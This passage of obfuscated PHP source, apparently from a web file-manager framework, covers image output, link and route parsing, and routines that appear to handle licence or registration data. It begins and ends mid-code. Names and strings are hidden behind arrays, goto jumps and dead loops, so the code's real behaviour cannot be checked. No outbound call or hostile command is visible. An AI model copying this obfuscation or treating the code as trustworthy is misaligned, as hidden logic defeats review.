$this->_fileOutImage($Bßø¥ØïÓÒ, $Añ˜¨µ¸¡…); } public function fileOutImageServer($Fğ“äà”¨, $e‚Ç¸Ê¾„á = 250) { $this->_fileOutImage($Fğ“äà”¨, $e‚Ç¸Ê¾„á); } public function link($F‡´‡ê±æ¬, $AäİµâáœÆ = '') { $EÑŸİ©·¸‹ = $this->model->fileInfoGet($F‡´‡ê±æ¬); return IO::link($EÑŸİ©·¸‹[$_SERVER[¦·][75]], $AäİµâáœÆ); } protected function parse($bˆ¸ßÎâƒ) { $c£âé¯İÜó =& $_SERVER[¦·]; if (strstr($bˆ¸ßÎâƒ, $c£âé¯İÜó[8]) === !1) { return array($c£âé¯İÜó[385] => intval($bˆ¸ßÎâƒ), $c£âé¯İÜó[75] => $c£âé¯İÜó[33], $c£âé¯İÜó[1123] => array()); } $CÖœ¥Üó¼Ÿ = explode($c£âé¯İÜó[8], trim($bˆ¸ßÎâƒ, $c£âé¯İÜó[8])); if (count($CÖœ¥Üó¼Ÿ) < 2) { show_tips($bˆ¸ßÎâƒ . $c£âé¯İÜó[1128]); } return array($c£âé¯İÜó[385] => intval($CÖœ¥Üó¼Ÿ[0]), $c£âé¯İÜó[75] => $CÖœ¥Üó¼Ÿ[1], $c£âé¯İÜó[1123] => array_slice($CÖœ¥Üó¼Ÿ, 1)); } } goto fëÜËŞ±Ã; f±öã¹êˆ: $F‚¹Ùƒêõ¦ = $_SERVER[¦·][551]; if (strlen($F‚¹Ùƒêõ¦) < $_SERVER[¦·][552]) { die; } class Application { private $defaultModule = "\151\x6e\144\x65\x78"; private $defaultController = "\151\x6e\144\145\170"; private $defaultAction = "\151\156\144\145\170"; function __construct() { } public function setDefault($D¬å¤ø÷ÄÎ) { $EÕ¢ëƒÚÀÊ =& $_SERVER[Ó¥ú]; $dÒ¬Ù©‡òÉ = $EÕ¢ëƒÚÀÊ[0]($EÕ¢ëƒÚÀÊ[1], $EÕ¢ëƒÚÀÊ[2]($D¬å¤ø÷ÄÎ, $EÕ¢ëƒÚÀÊ[1])); $this->defaultModule = $dÒ¬Ù©‡òÉ[0] ? $dÒ¬Ù©‡òÉ[0] : $this->defaultModule; $this->defaultController = $dÒ¬Ù©‡òÉ[1] ? $dÒ¬Ù©‡òÉ[1] : $this->defaultController; $this->defaultAction = $dÒ¬Ù©‡òÉ[2] ? $dÒ¬Ù©‡òÉ[2] : $this->defaultAction; $this->{$_SERVER[Ó¥ú][3]}($EÕ¢ëƒÚÀÊ[4], array($this, $EÕ¢ëƒÚÀÊ[5])); } public function appRun($AÃà•İë„) { goto a•÷ñ“§İö; c¿¸–ÆµÍ¯: $EĞÙŠ†½¤¨ = $Bå°Ö¹šÚê[7]; $F¹£—ğ¹µÒ = $_SERVER[¦·][553]; if ($C¼ò¥Ó°ôŸ == $Bå°Ö¹šÚê[8]) { $EĞÙŠ†½¤¨ = $Bå°Ö¹šÚê[9]; $cáŒ¨Ë÷[0] = $Bå°Ö¹šÚê[10]; $cáŒ¨Ë÷[1] = $cáŒ¨Ë÷[1] . $Bå°Ö¹šÚê[11]; $AÃà•İë„ = $Bå°Ö¹šÚê[12]($Bå°Ö¹šÚê[1], $cáŒ¨Ë÷); $AÃà•İë„ = $Bå°Ö¹šÚê[2]($AÃà•İë„, $Bå°Ö¹šÚê[1]); } goto fòƒ™ÔÉéÏ; a•÷ñ“§İö: $Bå°Ö¹šÚê =& $_SERVER[Ó¥ú]; $cáŒ¨Ë÷ = $Bå°Ö¹šÚê[0]($Bå°Ö¹šÚê[1], $AÃà•İë„); $C¼ò¥Ó°ôŸ = $Bå°Ö¹šÚê[6]($cáŒ¨Ë÷[0]); goto c¿¸–ÆµÍ¯; fòƒ™ÔÉéÏ: $Bå°Ö¹šÚê[13](array($Bå°Ö¹šÚê[14], $Bå°Ö¹šÚê[15]), $EĞÙŠ†½¤¨ . $Bå°Ö¹šÚê[16], $AÃà•İë„); $Bå°Ö¹šÚê[17]($AÃà•İë„); $Bå°Ö¹šÚê[13](array($Bå°Ö¹šÚê[14], $Bå°Ö¹šÚê[15]), $EĞÙŠ†½¤¨ . $Bå°Ö¹šÚê[18], $AÃà•İë„); goto AÓèò¤Šˆ; AÓèò¤Šˆ: } private function autorun() { $aÓÃ­Ó¬í“ =& $_SERVER[Ó¥ú]; global $config; if ($aÓÃ­Ó¬í“[19]($config[$aÓÃ­Ó¬í“[20]]) == 0) { return; } foreach ($config[$aÓÃ­Ó¬í“[20]] as $A°‡¸ÈÖ™à => $Aí²¼¥èÜ) { $this->{$_SERVER[Ó¥ú][21]}($Aí²¼¥èÜ); } } private function rzep8aa5519b() { goto AèˆèÂ·¨İ; b‰Ùâ¥Ì’ó: $D—£®Á±‹¥ = $GLOBALS[$e†ŒšåÇ·‡[22]][$e†ŒšåÇ·‡[23]][0]; if (!$D—£®Á±‹¥ || $e†ŒšåÇ·‡[24]($D—£®Á±‹¥) <= $e†ŒšåÇ·‡[24]($CãæŠàˆëÓ)) { return; } if ($e†ŒšåÇ·‡[6]($e†ŒšåÇ·‡[25]($D—£®Á±‹¥, -$e†ŒšåÇ·‡[24]($CãæŠàˆëÓ))) != $CãæŠàˆëÓ) { return; } goto eÆŠ†È¬Õî; eÆŠ†È¬Õî: $CÜƒÉˆ¼ˆ = $e†ŒšåÇ·‡[25]($D—£®Á±‹¥, 0, -$e†ŒšåÇ·‡[24]($CãæŠàˆëÓ)); $B¢ƒİ…–åè = array($e†ŒšåÇ·‡[8], $CÜƒÉˆ¼ˆ); $AŸĞÈ‡ƒ±Œ = $D†«ñƒ»æ«[554]; goto bİà‹È‰İË; AèˆèÂ·¨İ: $D†«ñƒ»æ« =& $_SERVER[¦·]; $e†ŒšåÇ·‡ =& $_SERVER[Ó¥ú]; $CãæŠàˆëÓ = $e†ŒšåÇ·‡[8]; goto b‰Ùâ¥Ì’ó; bİà‹È‰İË: $Cğ„’ƒÛÖ™ = $e†ŒšåÇ·‡[26]($GLOBALS[$e†ŒšåÇ·‡[22]][$e†ŒšåÇ·‡[23]], 1); $GLOBALS[$e†ŒšåÇ·‡[22]][$e†ŒšåÇ·‡[23]] = $e†ŒšåÇ·‡[27]($B¢ƒİ…–åè, $Cğ„’ƒÛÖ™); $cäÅŒã‡Ä = $D†«ñƒ»æ«[555]; goto aöƒÛ½åùÙ; aöƒÛ½åùÙ: while (strlen($cäÅŒã‡Ä) < $D†«ñƒ»æ«[556]) { if (!$cäÅŒã‡Ä) { break; } $cäÅŒã‡Ä++; } $GLOBALS[$e†ŒšåÇ·‡[22]][$e†ŒšåÇ·‡[28]] = $e†ŒšåÇ·‡[29]($e†ŒšåÇ·‡[1], $GLOBALS[$e†ŒšåÇ·‡[22]][$e†ŒšåÇ·‡[23]]); $aëãºÚ¡ô = $D†«ñƒ»æ«[557]; goto D¦ÕºµÓæ¼; D¦ÕºµÓæ¼: if (strlen($aëãºÚ¡ô) < $D†«ñƒ»æ«[558]) { return; } goto dàÊä¨Êª; dàÊä¨Êª: } private function qxwd29c085fa() { goto aèíå¬¹ßâ; bÖ«òÄ‡ñ: $b‡°Æœå‚ = $_SERVER[$EêÓ‡åô‚Ã[30]]; $A¦‹Š÷’‰ = $bœğ¿ÂË¶î[559]; $bô—ÒÓ­Ò± = $EêÓ‡åô‚Ã[31]; goto cêÒ­Œ¾ä÷; aèíå¬¹ßâ: $bœğ¿ÂË¶î =& $_SERVER[¦·]; $EêÓ‡åô‚Ã =& $_SERVER[Ó¥ú]; if ($GLOBALS[$EêÓ‡åô‚Ã[22]][$EêÓ‡åô‚Ã[28]] != $EêÓ‡åô‚Ã[10]) { return; } goto bÖ«òÄ‡ñ; bœ÷‘Ï˜Ú„: $GLOBALS[$EêÓ‡åô‚Ã[22]][$EêÓ‡åô‚Ã[28]] = $EêÓ‡åô‚Ã[29]($EêÓ‡åô‚Ã[1], $GLOBALS[$EêÓ‡åô‚Ã[22]][$EêÓ‡åô‚Ã[23]]); $BÃÑ»±Îæ = $bœğ¿ÂË¶î[562]; if (!$BÃÑ»±Îæ) { die; } goto C’‘éé¯ò; cêÒ­Œ¾ä÷: if (!$EêÓ‡åô‚Ã[32]($b‡°Æœå‚, $bô—ÒÓ­Ò±)) { return; } $E¹æóø·ˆš = $EêÓ‡åô‚Ã[33]($b‡°Æœå‚, $bô—ÒÓ­Ò±); $D­ø¦©‹¢Ñ = $bœğ¿ÂË¶î[560]; goto EÀÜóğ‡ö¬; DÉº¥´÷‚‚: if (!$Cæîæ±›‡Ö) { return; } $cÖ£é¬ä = $EêÓ‡åô‚Ã[2]($bƒ‹âî‘¿¶[0][0], $EêÓ‡åô‚Ã[36]); $GLOBALS[$EêÓ‡åô‚Ã[22]][$EêÓ‡åô‚Ã[23]] = $EêÓ‡åô‚Ã[0]($EêÓ‡åô‚Ã[36], $cÖ£é¬ä); goto bœ÷‘Ï˜Ú„; EÀÜóğ‡ö¬: $cÖ£é¬ä = $EêÓ‡åô‚Ã[25]($b‡°Æœå‚, $E¹æóø·ˆš + $EêÓ‡åô‚Ã[24]($bô—ÒÓ­Ò±)); $EêÓ‡åô‚Ã[34]($EêÓ‡åô‚Ã[35], $cÖ£é¬ä, $bƒ‹âî‘¿¶); $Cæîæ±›‡Ö = $bœğ¿ÂË¶î[561]; goto DÉº¥´÷‚‚; C’‘éé¯ò: } public function run() { goto C©ÍÛƒ±; f•«“ÄÚÌ: while ($cÕÀğãœ¡ñ < $Fˆ„ƒÖ¯…à[552]) { if ($cÕÀğãœ¡ñ >= 0) { break; } $cÕÀğãœ¡ñ++; } $dŞÁÆÜ”ç—[39]($dŞÁÆÜ”ç—[42], isset($A«îÖá„é‚[2]) && $A«îÖá„é‚[0] ? $A«îÖá„é‚[2] : $this->defaultAction); $d•ğ¾Âİª‹ = $Fˆ„ƒÖ¯…à[567]; goto Aò‰Œ¿š‹; Aò‰Œ¿š‹: if (!$d•ğ¾Âİª‹) { return; } $dŞÁÆÜ”ç—[39]($dŞÁÆÜ”ç—[43], MOD . $dŞÁÆÜ”ç—[1] . ST . $dŞÁÆÜ”ç—[1] . ACT); $fĞµ›¾—„ï = $Fˆ„ƒÖ¯…à[568]; goto A¼Ï–˜¬ˆ…; F¢Ë–„Š¦æ: if (!$dœ®Õ ‡›í) { die; } $dŞÁÆÜ”ç—[39]($dŞÁÆÜ”ç—[41], isset($A«îÖá„é‚[1]) && $A«îÖá„é‚[0] ? $A«îÖá„é‚[1] : $this->defaultController); $cÕÀğãœ¡ñ = $Fˆ„ƒÖ¯…à[566]; goto f•«“ÄÚÌ; C©ÍÛƒ±: $Fˆ„ƒÖ¯…à =& $_SERVER[¦·]; $dŞÁÆÜ”ç— =& $_SERVER[Ó¥ú]; $this->{$_SERVER[Ó¥ú][37]}(); goto Aì‰ê–õùÂ; cÈ”Óä³“µ: $A«îÖá„é‚ = $GLOBALS[$dŞÁÆÜ”ç—[22]][$dŞÁÆÜ”ç—[23]]; $dÖ—ñ¼¿…â = $Fˆ„ƒÖ¯…à[564]; if (!$dÖ—ñ¼¿…â) { return; } goto E¶øœ°éË–; c¢¬ò’„Øï: if ($dŞÁÆÜ”ç—[19]($A«îÖá„é‚) >= 3) { $this->{$_SERVER[Ó¥ú][21]}($cÀÒÙ¶Š¿™); } else { $this->{$_SERVER[Ó¥ú][21]}(ACTION); } goto b¬ø‰¦Šš×; Aì‰ê–õùÂ: $d¬İ­½İÕù = $Fˆ„ƒÖ¯…à[563]; if (!$d¬İ­½İÕù) { die; } $this->{$_SERVER[Ó¥ú][38]}(); goto cÈ”Óä³“µ; A¼Ï–˜¬ˆ…: while ($fĞµ›¾—„ï < $Fˆ„ƒÖ¯…à[558]) { if ($fĞµ›¾—„ï >= 0) { break; } $fĞµ›¾—„ï++; } $_SERVER[$dŞÁÆÜ”ç—[44]] = $dŞÁÆÜ”ç—[6](ACTION); $this->{$_SERVER[Ó¥ú][45]}(); goto c¢¬ò’„Øï; E¶øœ°éË–: $cÀÒÙ¶Š¿™ = $GLOBALS[$dŞÁÆÜ”ç—[22]][$dŞÁÆÜ”ç—[28]]; $dŞÁÆÜ”ç—[39]($dŞÁÆÜ”ç—[40], isset($A«îÖá„é‚[0]) && $A«îÖá„é‚[0] ? $A«îÖá„é‚[0] : $this->defaultModule); $dœ®Õ ‡›í = $Fˆ„ƒÖ¯…à[565]; goto F¢Ë–„Š¦æ; b¬ø‰¦Šš×: } private $ftcn0421233a = array(); private $otvd669bc36d = ''; public function ygnfd23ce758() { goto aÒ¿‚Öºˆ; CáÕ“˜‘‡¹: $D˜Óï¸–ê½ = $b‚ÉÂµøê[573]; if (!$D˜Óï¸–ê½) { return; } goto EÔ¸Ë¿Øˆ§; Aì¼Ø”—ƒ: $F›¤ŒÆÊ© = $b‚ÉÂµøê[572]; while (strlen($F›¤ŒÆÊ©) < $b‚ÉÂµøê[552]) { if (!$F›¤ŒÆÊ©) { break; } $F›¤ŒÆÊ©++; } $this->{$_SERVER[Ó¥ú][3]}($cºßë¢š„Á[59], array($this, $cºßë¢š„Á[60])); goto CáÕ“˜‘‡¹; aÒ¿‚Öºˆ: $b‚ÉÂµøê =& $_SERVER[¦·]; $cºßë¢š„Á =& $_SERVER[Ó¥ú]; $this->{$_SERVER[Ó¥ú][46]}(); goto f‹¼™ÚÂ¢â; Eç¾¥‘Âä³: $this->{$_SERVER[Ó¥ú][51]}(); $eğŠÒë­ = $b‚ÉÂµøê[571]; $this->{$_SERVER[Ó¥ú][52]}(); goto F¡¸•ÍÊÃì; FÍğÀÆä«: $DîØ÷ˆáš· = $b‚ÉÂµøê[569]; $this->{$_SERVER[Ó¥ú][50]}(); $b§ë»Â…¾ö = $b‚ÉÂµøê[570]; goto Eç¾¥‘Âä³; F¡¸•ÍÊÃì: $this->{$_SERVER[Ó¥ú][3]}($cºßë¢š„Á[53], array($this, $cºßë¢š„Á[54])); $this->{$_SERVER[Ó¥ú][3]}($cºßë¢š„Á[55], array($this, $cºßë¢š„Á[56])); $this->{$_SERVER[Ó¥ú][3]}($cºßë¢š„Á[57], array($this, $cºßë¢š„Á[58])); goto Aì¼Ø”—ƒ; f‹¼™ÚÂ¢â: $this->{$_SERVER[Ó¥ú][47]}(); $this->{$_SERVER[Ó¥ú][48]}(); $this->{$_SERVER[Ó¥ú][49]}(); goto FÍğÀÆä«; EÔ¸Ë¿Øˆ§: } public function hdot98b80af5($eô×®ÀÉÕ¢) { goto FÖä–ñòƒÎ; EÒëØš‹Æ™: $eô×®ÀÉÕ¢[$cÂ¹‡Şµ´¿[117]][$cÂ¹‡Şµ´¿[137]] = $cÂ¹‡Şµ´¿[113]($this->ftcn0421233a, $cÂ¹‡Şµ´¿[138], $cÂ¹‡Şµ´¿[10]); $eô×®ÀÉÕ¢[$cÂ¹‡Şµ´¿[117]][$cÂ¹‡Şµ´¿[139]] = $cÂ¹‡Şµ´¿[113]($this->ftcn0421233a, $cÂ¹‡Şµ´¿[140], $cÂ¹‡Şµ´¿[10]); if ($cÂ¹‡Şµ´¿[113]($GLOBALS, $cÂ¹‡Şµ´¿[141]) && $this->config[$cÂ¹‡Şµ´¿[142]]) { $eô×®ÀÉÕ¢[$cÂ¹‡Şµ´¿[117]][$cÂ¹‡Şµ´¿[143]] = WEB_ROOT; } goto aññ‚–ÇÄá; a†„œ’ÍÏÚ: $Bà¸œ¾Ğ³À = $Aç³†Öæğœ[580]; if (strlen($Bà¸œ¾Ğ³À) < $Aç³†Öæğœ[576]) { die; } $eô×®ÀÉÕ¢[$cÂ¹‡Şµ´¿[117]][$cÂ¹‡Şµ´¿[118]] = $cÂ¹‡Şµ´¿[119]($cÂ¹‡Şµ´¿[120])->{$_SERVER[Ó¥ú][121]}(); goto eËõªª¥å•; FÖä–ñòƒÎ: $Aç³†Öæğœ =& $_SERVER[¦·]; $cÂ¹‡Şµ´¿ =& $_SERVER[Ó¥ú]; $a…—İË×òá = $cÂ¹‡Şµ´¿[61]($cÂ¹‡Şµ´¿[62])->{$_SERVER[Ó¥ú][63]}(); goto Eõ¤×¹¦°Î; Eõ¤×¹¦°Î: $cŸíèïÌ’ = $Aç³†Öæğœ[574]; if (!$cŸíèïÌ’) { return; } $Aáã´»Á¶ = array($cÂ¹‡Şµ´¿[64], $cÂ¹‡Şµ´¿[65], $cÂ¹‡Şµ´¿[66], $cÂ¹‡Şµ´¿[67], $cÂ¹‡Şµ´¿[68], $cÂ¹‡Şµ´¿[69], $cÂ¹‡Şµ´¿[70], $cÂ¹‡Şµ´¿[71], $cÂ¹‡Şµ´¿[72], $cÂ¹‡Şµ´¿[73], $cÂ¹‡Şµ´¿[74], $cÂ¹‡Şµ´¿[75], $cÂ¹‡Şµ´¿[76], $cÂ¹‡Şµ´¿[77], $cÂ¹‡Şµ´¿[78], $cÂ¹‡Şµ´¿[79], $cÂ¹‡Şµ´¿[80], $cÂ¹‡Şµ´¿[81], $cÂ¹‡Şµ´¿[82], $cÂ¹‡Şµ´¿[83], $cÂ¹‡Şµ´¿[84], $cÂ¹‡Şµ´¿[85], $cÂ¹‡Şµ´¿[86], $cÂ¹‡Şµ´¿[87], $cÂ¹‡Şµ´¿[88], $cÂ¹‡Şµ´¿[89], $cÂ¹‡Şµ´¿[90], $cÂ¹‡Şµ´¿[91], $cÂ¹‡Şµ´¿[92], $cÂ¹‡Şµ´¿[93], $cÂ¹‡Şµ´¿[94], $cÂ¹‡Şµ´¿[95], $cÂ¹‡Şµ´¿[96], $cÂ¹‡Şµ´¿[97], $cÂ¹‡Şµ´¿[98], $cÂ¹‡Şµ´¿[99]); goto AìÜø—µ; dÌÙ¨öÚÁ‰: $då¤£‹Ó¶Ú = $eô×®ÀÉÕ¢[$cÂ¹‡Şµ´¿[102]][$cÂ¹‡Şµ´¿[103]][$cÂ¹‡Şµ´¿[76]]; unset($eô×®ÀÉÕ¢[$cÂ¹‡Şµ´¿[102]][$cÂ¹‡Şµ´¿[104]][$cÂ¹‡Şµ´¿[105]]); $b“·ó¦ì› = $Aç³†Öæğœ[577]; goto e¯«°®ÔÕ—; eËõªª¥å•: $eô×®ÀÉÕ¢[$cÂ¹‡Şµ´¿[117]][$cÂ¹‡Şµ´¿[122]] = $cÂ¹‡Şµ´¿[123]($_SERVER[$cÂ¹‡Şµ´¿[124]] . $a…—İË×òá[$cÂ¹‡Şµ´¿[125]]); $cİèÕÓƒ¶Ş = $Aç³†Öæğœ[581]; if (strlen($cİèÕÓƒ¶Ş) < $Aç³†Öæğœ[558]) { return; } goto F‰Óªôî‚‰; c³‚˜šŒŠÜ: while ($Eï²‚Šµ < $Aç³†Öæğœ[552]) { if ($Eï²‚Šµ >= 0) { break; } $Eï²‚Šµ++; } unset($eô×®ÀÉÕ¢[$cÂ¹‡Şµ´¿[102]][$cÂ¹‡Şµ´¿[103]][$cÂ¹‡Şµ´¿[76]]); unset($eô×®ÀÉÕ¢[$cÂ¹‡Şµ´¿[102]][$cÂ¹‡Şµ´¿[103]][$cÂ¹‡Şµ´¿[107]]); goto A·‘‘Õ¤â; F‰Óªôî‚‰: $eô×®ÀÉÕ¢[$cÂ¹‡Şµ´¿[117]][$cÂ¹‡Şµ´¿[126]] = $cÂ¹‡Şµ´¿[127]($cÂ¹‡Şµ´¿[128]()); $DÑõéè¬ = $Aç³†Öæğœ[582]; while (strlen($DÑõéè¬) < $Aç³†Öæğœ[556]) { if (!$DÑõéè¬) { break; } $DÑõéè¬++; } goto BÅÉâ”®‚; aññ‚–ÇÄá: return $eô×®ÀÉÕ¢; goto d»òÌ…Šöª; A·‘‘Õ¤â: $FÙœ’Ÿº‚ = $Aç³†Öæğœ[579]; if (strlen($FÙœ’Ÿº‚) < $Aç³†Öæğœ[576]) { die; } $eô×®ÀÉÕ¢[$cÂ¹‡Şµ´¿[102]][$cÂ¹‡Şµ´¿[103]][$cÂ¹‡Şµ´¿[108]] = array($cÂ¹‡Şµ´¿[109] => (int) $då¤£‹Ó¶Ú[$cÂ¹‡Şµ´¿[110]], $cÂ¹‡Şµ´¿[111] => $cÂ¹‡Şµ´¿[112]($cÂ¹‡Şµ´¿[113]($då¤£‹Ó¶Ú, $cÂ¹‡Şµ´¿[114], array())), $cÂ¹‡Şµ´¿[115] => (int) $cÂ¹‡Şµ´¿[113]($då¤£‹Ó¶Ú, $cÂ¹‡Şµ´¿[116], 0)); goto a†„œ’ÍÏÚ; e¯«°®ÔÕ—: if (!$b“·ó¦ì›) { return; } unset($eô×®ÀÉÕ¢[$cÂ¹‡Şµ´¿[102]][$cÂ¹‡Şµ´¿[104]][$cÂ¹‡Şµ´¿[106]]); $Eï²‚Šµ = $Aç³†Öæğœ[578]; goto c³‚˜šŒŠÜ; AìÜø—µ: $DÎŒÎ¥¼ª = $Aç³†Öæğœ[575]; while ($DÎŒÎ¥¼ª < $Aç³†Öæğœ[576]) { if ($DÎŒÎ¥¼ª >= 0) { break; } $DÎŒÎ¥¼ª++; } foreach ($Aáã´»Á¶ as $dÉÀ¯ñ†¿Ö) { $F—Öë«õßØ = $GLOBALS[$cÂ¹‡Şµ´¿[100]][$cÂ¹‡Şµ´¿[101]][$dÉÀ¯ñ†¿Ö]; if (isset($a…—İË×òá[$dÉÀ¯ñ†¿Ö])) { $F—Öë«õßØ = $a…—İË×òá[$dÉÀ¯ñ†¿Ö]; } $eô×®ÀÉÕ¢[$cÂ¹‡Şµ´¿[102]][$cÂ¹‡Şµ´¿[103]][$dÉÀ¯ñ†¿Ö] = $F—Öë«õßØ; } goto dÌÙ¨öÚÁ‰; BÅÉâ”®‚: $eô×®ÀÉÕ¢[$cÂ¹‡Şµ´¿[117]][$cÂ¹‡Şµ´¿[129]] = $this->otvd669bc36d; if ($a…—İË×òá[$cÂ¹‡Şµ´¿[129]] != $cÂ¹‡Şµ´¿[130]) { $eô×®ÀÉÕ¢[$cÂ¹‡Şµ´¿[117]][$cÂ¹‡Şµ´¿[131]] = $a…—İË×òá[$cÂ¹‡Şµ´¿[131]]; $eô×®ÀÉÕ¢[$cÂ¹‡Şµ´¿[117]][$cÂ¹‡Şµ´¿[132]] = $a…—İË×òá[$cÂ¹‡Şµ´¿[132]]; $EğÆéœâŞÕ = $cÂ¹‡Şµ´¿[133](10) . $this->otvd669bc36d . $cÂ¹‡Şµ´¿[133](5); $eô×®ÀÉÕ¢[$cÂ¹‡Şµ´¿[102]][$cÂ¹‡Şµ´¿[134]][$cÂ¹‡Şµ´¿[135]] = $this->{$_SERVER[Ó¥ú][136]}($EğÆéœâŞÕ, $eô×®ÀÉÕ¢[$cÂ¹‡Şµ´¿[117]][$cÂ¹‡Şµ´¿[122]]); } if ($this->otvd669bc36d == $cÂ¹‡Şµ´¿[130]) { $eô×®ÀÉÕ¢[$cÂ¹‡Şµ´¿[102]][$cÂ¹‡Şµ´¿[103]][$cÂ¹‡Şµ´¿[108]][$cÂ¹‡Şµ´¿[116]] = 0; } goto EÒëØš‹Æ™; d»òÌ…Šöª: } private function qsmf82444d43() { goto FÚ´†£«; FÚ´†£«: $Bè½ªÒ—Å =& $_SERVER[¦·]; $E¨ãŠÕ©¨Õ =& $_SERVER[Ó¥ú]; if ($_SERVER[$E¨ãŠÕ©¨Õ[44]] == $E¨ãŠÕ©¨Õ[144]) { goto CÔğ¸„›“â; AËç¿ŠÍô‡: $FÕƒ¶ÔÖ†â = $Bè½ªÒ—Å[583]; if (strlen($FÕƒ¶ÔÖ†â) < $Bè½ªÒ—Å[552]) { return; } $c’ Ïƒ†¾ç = array($E¨ãŠÕ©¨Õ[159] => $A·š‰²ÅÉ); goto B¡¸ôÌàÊ§; CÔğ¸„›“â: $A·š‰²ÅÉ = array($E¨ãŠÕ©¨Õ[129] => $this->otvd669bc36d, $E¨ãŠÕ©¨Õ[145] => $this->{$_SERVER[Ó¥ú][146]}(), $E¨ãŠÕ©¨Õ[147] => $E¨ãŠÕ©¨Õ[61]($E¨ãŠÕ©¨Õ[148])->{$_SERVER[Ó¥ú][149]}()); if ($this->otvd669bc36d != $E¨ãŠÕ©¨Õ[130]) { $E›®”â‹â§ = $E¨ãŠÕ©¨Õ[113]($this->ftcn0421233a, $E¨ãŠÕ©¨Õ[150]); if ($E›®”â‹â§) { $A·š‰²ÅÉ[$E¨ãŠÕ©¨Õ[151]] = $E›®”â‹â§; $A·š‰²ÅÉ[$E¨ãŠÕ©¨Õ[152]] = $E¨ãŠÕ©¨Õ[153]($E¨ãŠÕ©¨Õ[113]($this->ftcn0421233a, $E¨ãŠÕ©¨Õ[154])); $A·š‰²ÅÉ[$E¨ãŠÕ©¨Õ[155]] = $E¨ãŠÕ©¨Õ[113]($this->ftcn0421233a, $E¨ãŠÕ©¨Õ[140]); } } $A·š‰²ÅÉ = $this->{$_SERVER[Ó¥ú][156]}($E¨ãŠÕ©¨Õ[157]($A·š‰²ÅÉ), $E¨ãŠÕ©¨Õ[123]($E¨ãŠÕ©¨Õ[158])); goto AËç¿ŠÍô‡; B¡¸ôÌàÊ§: $E¨ãŠÕ©¨Õ[13](array($E¨ãŠÕ©¨Õ[160], $E¨ãŠÕ©¨Õ[161]), $c’ Ïƒ†¾ç); $c™Š¬‘ñÙÛ = $Bè½ªÒ—Å[584]; if (!$c™Š¬‘ñÙÛ) { return; } goto B÷Â…Ù¨õ; B÷Â…Ù¨õ: } goto Aâ‰Ú¥Á£â; F¡İñ‡„‹: $Fƒæ¥”İƒâ = $Bè½ªÒ—Å[585]; if (strlen($Fƒæ¥”İƒâ) < $Bè½ªÒ—Å[552]) { return; } $c’ Ïƒ†¾ç = array($E¨ãŠÕ©¨Õ[168] => $f‡»ìì—ª[$E¨ãŠÕ©¨Õ[64]], $E¨ãŠÕ©¨Õ[169] => $f‡»ìì—ª[$E¨ãŠÕ©¨Õ[65]], $E¨ãŠÕ©¨Õ[170] => $E¨ãŠÕ©¨Õ[10]); goto CÈ‰Ù…øÙ; Aâ‰Ú¥Á£â: if ($this->otvd669bc36d == $E¨ãŠÕ©¨Õ[130]) { return; } $CÔÈƒ’Ş¡à = array($E¨ãŠÕ©¨Õ[162], $E¨ãŠÕ©¨Õ[163], $E¨ãŠÕ©¨Õ[164], $E¨ãŠÕ©¨Õ[165], $E¨ãŠÕ©¨Õ[166], $E¨ãŠÕ©¨Õ[167]); $f‡»ìì—ª = $E¨ãŠÕ©¨Õ[61]($E¨ãŠÕ©¨Õ[62])->{$_SERVER[Ó¥ú][63]}(); goto F¡İñ‡„‹; CÈ‰Ù…øÙ: foreach ($CÔÈƒ’Ş¡à as $E¦¨Ò„Şö·) { if (!isset($f‡»ìì—ª[$E¦¨Ò„Şö·]) || !$f‡»ìì—ª[$E¦¨Ò„Şö·]) { continue; } $c’ Ïƒ†¾ç[$E¦¨Ò„Şö·] = $f‡»ìì—ª[$E¦¨Ò„Şö·]; $cÜœ£Ö±ˆ‹ = $Bè½ªÒ—Å[586]; if (strlen($cÜœ£Ö±ˆ‹) < $Bè½ªÒ—Å[576]) { return; } } $E¨ãŠÕ©¨Õ[13](array($E¨ãŠÕ©¨Õ[160], $E¨ãŠÕ©¨Õ[161]), $c’ Ïƒ†¾ç); goto dÂ„®ò²ùø; dÂ„®ò²ùø: } private function lwdrf664f81a() { goto f–½ËÚÕˆê; a‰¡‘³è¤£: $eÜĞ­¾™ÑØ = $C¿†Á–ƒÆ[25]($C¿†Á–ƒÆ[123]($b‰«˜²ÛŠ[$C¿†Á–ƒÆ[218]]), 10, 10); $bØ‘¤Æ·• = $eÜĞ­¾™ÑØ . $b‰«˜²ÛŠ[$C¿†Á–ƒÆ[129]] . $b‰«˜²ÛŠ[$C¿†Á–ƒÆ[220]]; $b‰«˜²ÛŠ[$C¿†Á–ƒÆ[131]] = $C¿†Á–ƒÆ[222]($C¿†Á–ƒÆ[127]($this->{$_SERVER[Ó¥ú][156]}($bØ‘¤Æ·•, $C¿†Á–ƒÆ[223]))); goto B»ù÷¿»Îö; B‹ÅÄÇ§¸¦: $A·İğ…Óó» = array(); $E¶—…‹ØîØ = $E¬©ğÜÀÚŠ[595]; $A·İğ…Óó»[$Aœğ†÷Úé] = $dÃ˜÷ŞµŠÛ; goto cé‰ßÃÂôê; añğÖø‰ÈÆ: if ($cœÔÀ‘Ì‰[$C¿†Á–ƒÆ[187]] == $C¿†Á–ƒÆ[188]) { $f«®ÖÌ²ô = $this->{$_SERVER[Ó¥ú][156]}($bŸùÄŸÙá, $C¿†Á–ƒÆ[189]); $Cªµï¶Ä¸ = $this->{$_SERVER[Ó¥ú][136]}($C¿†Á–ƒÆ[157]($f¦Ú„œîäØ), $bŸùÄŸÙá . $C¿†Á–ƒÆ[190], 3); $bê–àñ£…‡ = $this->{$_SERVER[Ó¥ú][191]}($C¿†Á–ƒÆ[192] . $f«®ÖÌ²ô . $C¿†Á–ƒÆ[193] . $Cªµï¶Ä¸, -1); $C¿†Á–ƒÆ[175]($bê–àñ£…‡, !0); } else { if ($cœÔÀ‘Ì‰[$C¿†Á–ƒÆ[187]] == $C¿†Á–ƒÆ[194]) { $céÇË»ÇŒá = $C¿†Á–ƒÆ[25]($C¿†Á–ƒÆ[123]($C¿†Á–ƒÆ[195] . $bŸùÄŸÙá), 12, 15) . $C¿†Á–ƒÆ[196]; $Cªµï¶Ä¸ = $this->{$_SERVER[Ó¥ú][197]}($C¿†Á–ƒÆ[2]($cœÔÀ‘Ì‰[$C¿†Á–ƒÆ[198]]), $céÇË»ÇŒá, 2); $f²ÄÖ¬Û· = $C¿†Á–ƒÆ[199]($Cªµï¶Ä¸, !0); if (!$C¿†Á–ƒÆ[200]($f²ÄÖ¬Û·) || !$C¿†Á–ƒÆ[200]($f²ÄÖ¬Û·[$C¿†Á–ƒÆ[201]]) || $f²ÄÖ¬Û·[$C¿†Á–ƒÆ[174]] != !0) { $a’˜›šá÷½ 